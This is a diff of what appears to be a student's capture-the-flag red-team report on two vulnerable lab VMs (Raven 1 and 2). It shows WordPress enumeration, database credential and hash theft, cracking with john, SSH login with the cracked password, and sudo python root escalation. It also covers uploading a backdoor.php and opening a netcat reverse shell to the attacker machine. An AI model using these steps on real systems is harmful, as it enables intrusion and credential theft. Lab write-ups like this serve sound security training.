@@ -1,11 +1,6 @@
 # Final-Project
 # Read Team: Summary of Operations
 
-### Table of Contents
-- Scanning the network
-- Exposed Services
-- Critical Vulnerabilities
-- Exploitation
 
 ### Network Scan
 #### netdiscover
@@ -18,6 +13,10 @@ Output Screenshot:
 
 ![Netdiscover scan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/netdiscover.png "Netdiscover scan results")
 
+#### Description of Targets
+
+- Two VMs on the network were vulnerable to attack: `Target 1 (192.168.1.110) and Target 2 (192.168.1.115)`
+
 This scan identified the following machines and the corresponding IP addresses:
 
 | IP | Machine |
@@ -27,6 +26,8 @@ This scan identified the following machines and the corresponding IP addresses:
 | 192.168.1.105 | ELK server  |
 | 192.168.1.110 | Target 1, Raven 1 |
 | 192.168.1.115 | Target 2, Raven 2 |
+
+### Target1
 
 ### Exposed Services
 Nmap scan results for each machine revealed the below services and OS details:
@@ -80,7 +81,7 @@ Identified following users with wpscan:
     - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
     - Commands:
         - `cd var/www/html`
-        -  grep -rl 'flag1'
+        - `grep -rl 'flag1`
         - `nano service.html`
 
 ![Flag 1 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag1grep.png "Flag 1 location")
@@ -140,45 +141,126 @@ Got hashed passwords of both the users `Michael` and `Steven` from the users tab
 
 ![Users](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/userstable.png "Users")
 
-- **Flag4: 715dea6c055b9fe3337544932f2941ce**
-- Exploit Used:
-    - Unsalted password hash and the use of privilege escalation with Python.
-    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
-        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
-        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
-            - Commands:
-                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
-                - `show databases;`
-                - `use wordpress;` 
-                - `show tables;`
-                - `select * from wp_users;`
+Created a wp_hashes.txt with Steven and Michael's hashes,cracked the password hashes with `john`.
 
-        - ![wp_users table](/Images/wpusers-table.png "wp_users table")
-
-        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
+On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
             - Command:
                 - `john wp_hashes.txt`
 
-        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")
+![john](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/john.png "john")
 
-        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
-            - Commands: 
-                - `ssh steven@192.168.1.110`
-                - `pw:pink84`
-                - `sudo -l`
-                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
-                - `cd /root`
-                - `ls`
-                - `cat flag4.txt`
+Secured a user `Steven` shell as the user whose password cracked as `pink84`.
 
-![Flag 4 location](/Images/flag4-location.png "Flag 4 location")
 
-The following vulnerabilities were  identified on each target:
+
+![stevenssh](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/stevenssh.png "stevenssh")
+
+**Privilege escalation using Python**
+
+Escalated to root, using the python script
+
+`sudo python -c 'import pty;pty.spawn("/bin/bash")' `
+
+![python](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/python.png "python")
+
+Once escalated to root 
+   - Commands
+           - `cd /root`
+           - `ls`
+           - `cat flag4.txt`
+
+- **Flag4: 715dea6c055b9fe3337544932f2941ce**
+- 
+
+       
+![Flag 4 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag4.png "Flag 4")
+
+The following vulnerabilities were  identified on target1:
 
 **Target 1**
 1. User Enumeration (WordPress site)
 2. Weak User Password
 3. Unsalted User Password Hash (WordPress database)
 4. Misconfiguration of User Privileges/Privilege Escalation
+
+### Target2
+Target 2's IP Address: `192.168.1.115`
+
+Enumerated the web server with nikto.
+
+ `nikto -C all -h 192.168.1.115`
+ 
+This creates a list of URLs the Target HTTP server exposes. This server is running Apache Server.
+
+![nikto location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nikto.png "nikto")
+
+Performed a more in-depth enumeration with gobuster.
+
+Installed gobuster using apt 
+`apt-get install gobuster`
+
+![Gobuster install](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobusterinstall.png "gobusterinstall")
+
+`gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u “http://192.168.1.115” `
+
+![Gobuster](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobuster.png "gobusterinstall")
+
+Found a flag in  the /vendor directory. 
+
+![vendor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/vendor.png "vendor")
+
+**Flag1**
+
+![flag1vendor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flaginvendor.png "flag1vendor")
+
+
+Used searchsploit to find any known vulnerabilities associated with the programs found in Step
+
+`searchsploit –h`
+Used the provided script exploit.sh to exploit the vulnerability.
+Edited the line at the top of the exploit.sh script to set the `TARGET`variable. Set it equal to the IP address of Target 2 `192.168.1.115`.
+
+![Edit exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploitedit.png "exploit")   
+
+Ran the script. It uploaded a file called backdoor.php to the target server. This file was used to execute command injection attack by opening an Ncat connection to the Kali VM.
+
+![exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploit.png "exploit")   
+
+
+
+Navigate to: `http://192.168.1.115/backdoor.php?cmd=ls`
+
+This allowed you to run bash commands on Target 2.
+
+![backdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/backdoor.png "backdoor")   
+
+Used the backdoor to open a shell session on the target 2.
+
+On the Kali VM, started a netcat listener using command : 
+
+`nc -lnvp 4444 `
+![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nclistener.png "listener")   
+
+
+In the browser, used the backdoor to run: 
+
+nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.
+    
+    ![listener1](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener1")   
+
+Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
+    
+Command: `find /var/www -type f -iname 'flag*' `
+    
+![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3command.png "flag3")     
+
+Opened the flag in the browser window.
+http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png.
+    **Flag3**
+    
+  ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3target2.png "flag3")     
+
+
+
 
 
